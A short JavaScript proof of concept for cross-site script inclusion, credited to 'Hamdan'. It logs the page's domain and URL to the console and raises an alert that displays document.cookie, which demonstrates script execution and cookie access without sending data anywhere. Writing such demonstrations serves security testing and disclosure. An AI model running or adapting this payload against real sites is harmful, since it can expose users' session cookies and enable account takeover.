/*
XSSI Proof of Concept
Author: Hamdan
Purpose: Demonstrate cross-site script inclusion
*/
 
(function () {
    const data = {
        poc: "XSSI confirmed",
        domain: document.domain,
        url: window.location.href
    };
 
    console.log("[XSSI PoC]", data);
    alert("XSSI PoC executed on: " + document.cookie);
})();
